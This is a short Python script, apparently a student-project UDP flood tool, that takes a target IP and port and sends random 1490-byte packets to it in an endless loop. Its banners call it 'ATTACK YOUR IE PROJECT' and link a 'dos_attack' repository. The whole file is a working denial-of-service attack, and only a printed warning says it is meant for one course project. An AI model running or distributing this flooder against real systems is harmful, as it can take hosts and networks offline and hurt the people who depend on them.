import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ATTACK YOUR IE PROJECT")
print
print ("Reference: Ha3MrX ")
print ("Author   : TA-04")
print ("github   : https://github.com/Duchenne0080/dos_attack")
print
ip = input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet WARNING")
print ("This is for Monash IE project only, do not attack others!!!")
sent = 0
port = int(port)
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))